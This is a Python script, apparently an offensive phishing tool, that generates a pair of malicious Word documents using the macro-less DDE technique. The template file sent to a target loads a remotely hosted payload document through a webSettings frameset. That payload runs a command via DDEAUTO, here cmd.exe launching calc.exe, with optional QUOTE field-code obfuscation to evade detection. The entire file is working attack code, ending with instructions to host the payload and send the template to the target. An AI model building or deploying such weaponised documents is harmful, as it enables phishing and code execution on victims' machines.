import zipfile
import argparse
import os
import tempfile
import shutil
from lxml import etree

__version__ = "1.0"
__author__ = "0xdeadbeefJERKY"

"""
Leverages the macro-less DDE code execution technique described 
by @_staaldraad and @0x5A1F (blog post link in References 
section below) to generate two malicious Word documents:

template-final.docx
- This is the document sent to the target (e.g., via phishing).
  The webSettings configured to pull DDE from payload-final.docx, 
  which is hosted by a server specified by the user. 

payload-final.docx
- Contains user-provided DDE payload/command string. Hosted by
  attacker-controlled server (URL provided by user and baked
  into template-final.docx).

Obfuscation and evasion techniques inspired by @_staaldraad
(blog post link in References setion below). 

References:
https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
https://staaldraad.github.io/2017/10/23/msword-field-codes/
"""

def arg_parse():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser()
    parser.add_argument('--obfuscate', action='store_true', dest='obfuscate', default=False, help='Enable {QUOTE} field code obfuscation')
    parser.add_argument('--version', action='version', version='%(prog)s 1.0')
    results = parser.parse_args()
    
    return results.obfuscate

def obfuscate_dde(payload):
    """Obfuscate DDE payload using {QUOTE} field code."""
    print "[*] Converting DDE payload using {QUOTE} field code..."    
    #out = "{ QUOTE "
    out = " QUOTE "
    
    for c in payload:
        out += (" %s"%ord(c))
    
    #out += " }"
    return out

def gen_payload(obfuscate):
    # Prompt user for DDE payload
    payload = []
    """
    arg1 = raw_input("[-] Enter DDE payload argument #1:\n")
    arg2 = raw_input("[-] Enter DDE payload argument #2:\n")
    arg3 = raw_input("[-] Enter DDE payload argument #3 (press ENTER to omit):\n")

    payload.append('DDEAUTO')
    payload.append(arg1)
    payload.append(arg2)
    payload.append(arg3)   
    """
    # Example set of DDE arguments to form payload
    payload.append('DDEAUTO')
    payload.append('"C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord.exe\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\cmd.exe"')
    payload.append('"/c calc.exe"')
    payload.append('"for security reasons"')

    # Obfuscate provided DDE payload (if enabled)
    if obfuscate:
        obfusc_payload = []
        obfusc_payload.append(obfuscate_dde(payload[1]))
        obfusc_payload.append(obfuscate_dde(payload[2]))
        obfusc_payload.append(obfuscate_dde(payload[3]))
        #obfusc_payload.append(' DDEAUTO { REF c } { REF d } { REF e } ')
        #obfusc_payload = " ".join(obfusc_payload)
    else:
        payload = " ".join(payload)
        obfusc_payload = payload
    

    print '[*] Selected DDE payload: {}'.format(payload)

    if obfuscate:
        print '[*] Obfuscated DDE payload: {}'.format(obfusc_payload)

    # Prompt user for server hosting payload Office document (referenced by 'template')
    #targetsvr = raw_input("[-] Enter server URL (hosting payload Office file): ")
    if obfuscate:
        #targetsvr = targetsvr + '/payload-obfuscated-final.docx'
        targetsvr = 'http://localhost:8000/payload-obfuscated-final.docx'
    else:
        #targetsvr = targetsvr + '/payload-final.docx'
        targetsvr = 'http://localhost:8000/payload-final.docx'

    return obfusc_payload, targetsvr

if __name__ == "__main__":
    # Parse arguments from command-line
    obfuscate = arg_parse()
    
    # Set output file names and create zipfile objects for each
    if obfuscate:
        payload_out = "payload-obfuscated-final.docx"
        zfpay = zipfile.ZipFile('payload-obfuscated.docx')
    else:
        payload_out = "payload-final.docx"
        zfpay = zipfile.ZipFile('payload.docx')
    template_out = "template-final.docx"   
    zftemplate = zipfile.ZipFile('template.docx') 

    obfusc_payload, targetsvr = gen_payload(obfuscate)

    # Define frameset XML code (to be inserted in template.docx/word/webSettings.xml)
    frameset = '<w:frameset xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><w:framesetSplitbar><w:w w:val="60"/><w:color w:val="auto"/><w:noBorder/></w:framesetSplitbar><w:frameset><w:frame><w:name w:val="1"/><w:sourceFileName r:id="rId1"/><w:linkedToFile/></w:frame></w:frameset></w:frameset>'
    frameset = etree.fromstring(frameset)

    # Define XML namespace
    word_schema = "{http://schemas.openxmlformats.org/wordprocessingml/2006/main}"
 
    # Edit payload document.xml to insert DDE payload
    docxml = zfpay.read('word/document.xml')
    doctree = etree.fromstring(docxml)
    # Edit template webSettings to insert frameset into webSettings.xml and 
    # webSettings.xml.rels file
    webxml = zftemplate.read('word/webSettings.xml')
    webtree = etree.fromstring(webxml)

    # Find 'webSettings' XML element and insert frameset as child element
    for node in webtree.iter(tag=etree.Element):
        if node.tag == word_schema + "webSettings":
            print '[*] Inserting frameset XML element into word/webSettings.xml...'
            node.insert(0,frameset)

    # Formulate XML elements necessary to insert nested, obfuscated DDE payload into 
    # payload.docx/word/document.xml (for obfuscated payloads only)
    instrtext = '''
                <w:body xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:p w:rsidR="00830AD6" w:rsidRDefault="00830AD6" w:rsidP="00830AD6"><w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>SET c</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>"</w:instrText></w:r><w:fldSimple w:instr=" ''' + obfusc_payload[0] + '''  "><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r><w:instrText>"</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p><w:p w:rsidR="00830AD6" w:rsidRDefault="00830AD6" w:rsidP="00830AD6"><w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>SET d</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> "</w:instrText></w:r><w:fldSimple w:instr=" ''' + obfusc_payload[1] + '''  "><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r><w:instrText xml:space="preserve">" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p><w:p w:rsidR="00830AD6" w:rsidRDefault="00830AD6" w:rsidP="00830AD6"><w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>SET e</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> "</w:instrText></w:r><w:fldSimple w:instr=" ''' + obfusc_payload[2] + '''  "><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r><w:instrText xml:space="preserve">" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r><w:bookmarkStart w:id="0" w:name="_GoBack"/><w:bookmarkEnd w:id="0"/></w:p><w:p w:rsidR="00522B43" w:rsidRDefault="00BF6731"><w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r><w:r><w:instrText xml:space="preserve"> DDEAUTO</w:instrText></w:r><w:r w:rsidR="00830AD6"><w:instrText xml:space="preserve"> </w:instrText></w:r><w:fldSimple w:instr=" REF c "><w:r w:rsidR="00830AD6"><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r w:rsidR="00830AD6"><w:instrText xml:space="preserve"> </w:instrText></w:r><w:fldSimple w:instr=" REF d "><w:r w:rsidR="00830AD6"><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r w:rsidR="00830AD6"><w:instrText xml:space="preserve"> </w:instrText></w:r><w:fldSimple w:instr=" REF e "><w:r w:rsidR="00830AD6"><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:t>!Unexpected End of Formula</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p><w:sectPr w:rsidR="00522B43"><w:pgSz w:w="12240" w:h="15840"/><w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/><w:cols w:space="720"/><w:docGrid w:linePitch="360"/></w:sectPr></w:body>
                '''

    # Find 'instrText' XML element and change value to DDE payload
    if obfuscate:
        for node in doctree.iter(tag=etree.Element):
            if node.tag == word_schema + "document":
                print '[*] Inserting DDE payload into document.xml...'
                instrtext = etree.fromstring(instrtext)
                node.insert(0, instrtext)
    else:
        for node in doctree.iter(tag=etree.Element):
            if node.tag == word_schema + "instrText":
                print '[*] Inserting DDE payload into document.xml...'
                node.text = obfusc_payload
    
    # Create temp directories and extract both payload.docx and template.docx files to them
    tmp_dir_pay = tempfile.mkdtemp()
    tmp_dir_template = tempfile.mkdtemp()
    zfpay.extractall(tmp_dir_pay)
    zftemplate.extractall(tmp_dir_template)

    # Write modified webSettings.xml to temp directory for template.docx
    with open(os.path.join(tmp_dir_template,'word/webSettings.xml'), 'w') as f:
        xmlstr = etree.tostring(webtree)
        f.write(xmlstr)

    # Create word/_rels/webSettings.xml.rels file and insert Relationships XML element
    websettingsrels = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="' + targetsvr + '" TargetMode="External"/></Relationships>'
    websettingsrels = etree.fromstring(websettingsrels)

    with open(os.path.join(tmp_dir_template,'word/_rels/webSettings.xml.rels'), 'w') as f:
        xmlstr = etree.tostring(websettingsrels)
        f.write(xmlstr)

    # Write modified word/document.xml to temp directory for payload.docx
    with open(os.path.join(tmp_dir_pay,'word/document.xml'), 'w') as f:
        xmlstr = etree.tostring(doctree)
        f.write(xmlstr)

    # Get a list of all the files in the original 
    filenames_pay = zfpay.namelist()
    filenames_template = zftemplate.namelist()

    # Now, create the new zip file and add all the files into the archive
    zfcopypay = payload_out
    zfcopytemplate = template_out

    with zipfile.ZipFile(zfcopypay, "w") as doc:
        for filename in filenames_pay:
            doc.write(os.path.join(tmp_dir_pay,filename), filename)

    with zipfile.ZipFile(zfcopytemplate, "w") as doc:
        for filename in filenames_pay:
            doc.write(os.path.join(tmp_dir_template,filename), filename)
        # Write webSettings.xml.rels file separately, as it was not included
        # in the original ZIP file listing
        doc.write(os.path.join(tmp_dir_template,"word/_rels/webSettings.xml.rels"), "word/_rels/webSettings.xml.rels")

    # Remove temporary directories
    shutil.rmtree(tmp_dir_pay)
    shutil.rmtree(tmp_dir_template)

    print '[*] Payload generation complete! Host {} on your server and send {} to your target.'.format(payload_out, template_out)